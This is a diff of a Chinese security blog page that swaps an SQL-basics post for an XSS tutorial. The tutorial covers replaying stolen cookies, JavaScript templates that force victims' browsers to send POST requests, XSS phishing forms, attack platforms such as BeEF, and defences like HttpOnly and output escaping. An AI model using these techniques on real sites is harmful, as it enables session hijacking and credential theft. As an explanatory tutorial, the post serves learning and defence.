-<p>收回u1对student表的查询权限</p>
+<p>然后当攻击者获取到cookie可以直接在对应的网站F12 console里面输入document.cookie=窃取到的cookie，然后就可以模拟登录了，当然能是要在网站没有做对应的限制的情况下。如果网站进行了IP与cookie绑定，或者依靠HttpOnly使攻击者只获得了一些无关紧要的cookie，那这招就不好用了，就要想其他办法利用了。</p>
 </blockquote>
 </li>
-<li><code>revoke select on table student from u1 cascade;</code><blockquote>
-<p>收回u1对student表的查询权限，并收回u1赋予别人对此表的查询权限</p>
+<li><p>构造GET或者POST请求</p>
+<blockquote>
+<p>因为不是什么时候盗取cookie都好用，有的时候获取不到cookie的时候，就需要跳过获取cookie、直接让用户发送一些我们需要的信息、或者使直接让用户的浏览器执行一些我们需要的操作。这就涉及到利用js构造一些GET和POST请求，让用户的浏览器自己执行攻击者想要的操作。然后用户发送GET操作代码可以直接参考上面的，但是这次就不是获取cookie了，而是直接使用户在当前网站做一些攻击者想要的操作。   </p>
+</blockquote>
+<blockquote>
+<p>书上有一个例子就是在一个博客网站利用xss，使用户的浏览器发送一个删除博客文章的get请求，原理和get发送cookie一样,只是get请求的链接使删除文章的链接。</p>
+</blockquote>
+<blockquote>
+<p>主要说一下发送post请求。两种方法：ajax和构造from表单（这两种方法也可以发送get请求，就是相对复杂）</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">//构造表单 可以 纯js 或者用innerHTML添加DOM文档 然后js执行submit()提交</span><br><span class="line">//直接用js</span><br><span class="line">    var f = document.createElement(&quot;form&quot;);</span><br><span class="line">    f.action = &quot;&quot;; //post提交的链接</span><br><span class="line">    f.method = &quot;post&quot;;</span><br><span class="line">    document.body.appendChild(f);</span><br><span class="line">    //添加参数 </span><br><span class="line">    var i1 = document.createElement(&quot;input&quot;);</span><br><span class="line">    i1.name = &quot;i&quot;;//参数名</span><br><span class="line">    i1.value = &quot;1&quot;;//参数值</span><br><span class="line">    f.appendChild(i1);</span><br><span class="line">    ...</span><br><span class="line">    //类似这种可以添加很多参数</span><br><span class="line">    f.submit();</span><br><span class="line">//在DOM文档中添加表单</span><br><span class="line">    var addDiv = document.createElement(&quot;div&quot;);</span><br><span class="line">    docment.body.appendChild(addDiv);</span><br><span class="line">    addDiv.innerHTML = &quot;&quot;;  //这里添加需要的表单 注意form表单加上id 以便发送 假设使test</span><br><span class="line">    document.getElementById(&quot;test&quot;).submit();</span><br><span class="line"></span><br><span class="line">//ajax </span><br><span class="line">try&#123;</span><br><span class="line">    xhr=new XMLHttpRequest();</span><br><span class="line">&#125;catch(e)&#123;</span><br><span class="line">    xhr=newActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">&#125;</span><br><span class="line">xhr.open(&quot;post&quot;,&quot;#&quot;,true);//# 提交到的链接</span><br><span class="line">xhr.setRequestHeader(&quot;content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xhr.send(&quot;a=hhhhh&amp;b=admin&quot;);//提交的内容</span><br><span class="line">xhr.onreadystatechange=function()&#123;</span><br><span class="line">if(xhr.readyState==4)&#123;</span><br><span class="line">    if(xhr.status==200)&#123;</span><br><span class="line">        ...</span><br><span class="line">        //如果提交成功要进行的操作</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>然后再DOM中添加表单的方法还可以用于XSS钓鱼，大致过程就是攻击者XSS向网页中添加一个表单，要求用户输入用户名密码，如果用户没有发现的话就会把自己的密码输入后发送给攻击者事先准备好的web接收接口。</p>
 </blockquote>
 </li>
+<li><p>一些信息收集用到的参数</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">navigator.userAgent  //用户浏览器版本</span><br><span class="line">document.location    //页面的一些信息</span><br><span class="line">document.cookie      //cookie</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>突然发现这个好像是一个挺大的学问，可以依靠JS收集到的信息不止包括这些，还有可能识别用户安装的软件（迅雷），浏览器插件，电脑操作系统，电脑IP，等等很多方面，网上也能找到很多利用脚本，还可以看一些xss平台的源代码。</p>
+</blockquote>
+</li>
+<li><p>一些工具</p>
+<ul>
+<li>XSS平台 <blockquote>
+<p>可以自己搭建，也可以直接用网上的,或者准备好payload，然后直接再服务器上监听80端口也可以</p>
+</blockquote>
+</li>
+<li>BeEF  <blockquote>
+<p>感觉从某种意义上讲也是xss平台的一种，但是有比XSS平台好很多的交互性，攻击者可以实时的向用户的前端发送各种指令，还可以配合metasploit，进一步渗透。</p>
+</blockquote>
+</li>
+<li><p>XSS shell </p>
+<blockquote>
+<p>和BeEF一样采用了一种叫XSS-Proxy的技术，可以实时的对受害者浏览器监控，原理是动态生成一个iframe，并可控制iframe的location值然后实现一些操作，但是这个XSS shell是再asp的就是要配置在Windows上，然后BeEF是直接集成在kali里面的。然后xss shell的配置和使用网上的教程比较少，我会单独写一篇文档介绍。</p>
+</blockquote>
+<h3 id="相关链接-："><a href="#相关链接-：" class="headerlink" title="相关链接 ："></a>相关链接 ：</h3></li>
+<li><a href="http://xsspt.com/" target="_blank" rel="noopener">XSS平台-安全测试</a></li>
+<li><a href="https://xss.pt/xss.php?do=login" target="_blank" rel="noopener">XSS平台- （支持http/https）XSS Platform</a></li>
+<li><a href="https://www.freebuf.com/sectool/4799.html" target="_blank" rel="noopener">FreeBuf: 如何在BeEF中使用metasploit颠覆你的浏览器</a></li>
+<li><a href="https://www.freebuf.com/articles/web/24114.html" target="_blank" rel="noopener">FreeBuf: 科普跨站平台XSS SHELL使用方法</a></li>
+<li><a href="https://github.com/portcullislabs/xssshell-xsstunnell" target="_blank" rel="noopener">github: xss shell项目地址</a></li>
+<li><a href="https://labs.portcullis.co.uk/tools/xss-shell/" target="_blank" rel="noopener">Portcullis实验室: xss shell</a></li>
+<li><a href="https://blog.csdn.net/yefengmeander/article/details/7353081" target="_blank" rel="noopener">利用XSS Shell进行XSS测试</a></li>
 </ul>
-<h1 id="0x03-视图"><a href="#0x03-视图" class="headerlink" title="0x03 视图"></a>0x03 视图</h1><p><code>create view as select user,pass from student;</code></p>
+</li>
+</ol>
+<h2 id="0x03-关于XSS防御"><a href="#0x03-关于XSS防御" class="headerlink" title="0x03 关于XSS防御"></a>0x03 关于XSS防御</h2><ol>
+<li><p>httpOlny </p>
 <blockquote>
-<p>将student表的user，pass建成一个视图，视图使用select查询结果建立，查询视图和查询表基本相同</p>
+<p>在关键的cookie上添加HTTPOnly是一种比较常见的保护cookie的措施，虽然是市面上一种标准的做法，但也不是完全的安全，比如（CVE-2012-005），就通过了植入超大的cookie，然后通过报错页面得到受保护cookie。而且这只是一种保护cookie的做法，不能防御不需要盗取cookie的其他类型xss。 然后关于php添加httponly的一些代码</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//php.ini中全局开启httponly</span><br><span class="line">; Whether or not to add the httpOnly flag to the cookie, which makes it inaccessible to browser scripting languages such as JavaScript.</span><br><span class="line">; http://php.net/session.cookie-httponly</span><br><span class="line">session.cookie_httponly =</span><br><span class="line">//代码中全局httponly</span><br><span class="line">ini_set(&quot;session.cookie_httponly&quot;, 1);</span><br><span class="line">//函数单独设置</span><br><span class="line">setcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE);  </span><br><span class="line">setrawcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE);</span><br><span class="line">//老版本header函数设置</span><br><span class="line">header(&quot;Set-Cookie: hidden=value; httpOnly&quot;);</span><br><span class="line">//等等</span><br></pre></td></tr></table></figure>
 </blockquote>
-<h1 id="0x04-索引"><a href="#0x04-索引" class="headerlink" title="0x04 索引"></a>0x04 索引</h1><p><code>create unique index stusno on student(sno);</code></p>
+</li>
+<li><p>输入输出检查</p>
 <blockquote>
-<p>在student表的sno列建立索引，unique代表唯一索引，还可以建立聚簇索引 ，可以在语句之前使用EXPLAIN，来查看是否使用索引</p>
+<p>输入的时候可以稍微严格要求输入，不只是前端添加验证函数和正则，服务器端也尤其要严格过滤，如果需要转义注意输出的时候不要改变原意。然后输出的时候，可以用一些转义函数，比如php的htmlspecialchars()函数将<code>&amp;、&quot;、&#39;、&lt;、&gt;</code> 这五个符号转化成html实体。还有更厉害的htmlentities()，转义全部字符为html实体字符等等。然后要注意前后端相配合合理的使用转义函数，正确的地方正确的编码转义，然后很多web前后端框架都有针对防御xss的转义函数，注意了解合理使用。</p>
 </blockquote>
-<h1 id="0x05-数据库导入导出"><a href="#0x05-数据库导入导出" class="headerlink" title="0x05 数据库导入导出"></a>0x05 数据库导入导出</h1><ul>
-<li>导出 ：终端下<code>mysqldump -u username -ppassword database &gt; /root/aa.sql</code> 密码可以后写</li>
-<li>导入 ：mysql终端下，use要导入表的数据库 <code>source /root/aa.sql</code></li>
-</ul>
+</li>
+<li>XSS Filter<blockquote>
+<p>比如Anti-Samy、HTMLPurify等等，用来检查一些比较长的文本中是否含有XSS。但是我也没有实际应用过，大致知道有这么个东西。</p>
+</blockquote>
+</li>
+</ol>
+<blockquote>
+<p>以上的方法也不能完全的防御XSS，还有一些比如DOM Based XSS需要合理的使用JS和HTML编码解码，还有各种比较偏门的XSS（Flash XSS）等等，需要编程人员时刻小心。</p>
+</blockquote>
+<h2 id="大佬的文章"><a href="#大佬的文章" class="headerlink" title="大佬的文章"></a>大佬的文章</h2><p><a href="https://www.freebuf.com/sectool/159689.html" target="_blank" rel="noopener">FreeBuf: 经验分享 | XSS手工利用方式</a>，感觉这个思路非常开阔，除了常见的盗取cookie，还讲解了利用XSS内网探测，挖矿，Dos攻击等。</p>
 
         
     
@@ -660,8 +686,8 @@
 
 <script type="text/javascript">
     var disqus_config = function () {
-        this.page.url = 'http://blog.ssssdl.xyz/2018/06/20/sql语句基础合集/';  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = 'http://blog.ssssdl.xyz/2018/06/20/sql语句基础合集/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        this.page.url = 'http://blog.ssssdl.xyz/2019/03/18/重新认识XSS/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://blog.ssssdl.xyz/2019/03/18/重新认识XSS/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
     };
 </script>
 
@@ -710,21 +736,13 @@
             <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
     <!-- Prev Nav -->
     
-        <a href="/2018/08/15/hackinglab做题脚本整理/" id="post_nav-newer" class="prev-content">
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_back</i>
-            </button>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            新篇
-        </a>
-    
 
     <!-- Section Spacer -->
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
     
-        <a href="/2018/06/18/python模拟鼠标键盘事件/" id="post_nav-older" class="next-content">
+        <a href="/2019/01/15/子域名挖掘工具aquatone/" id="post_nav-older" class="next-content">
             旧篇
             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
             <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
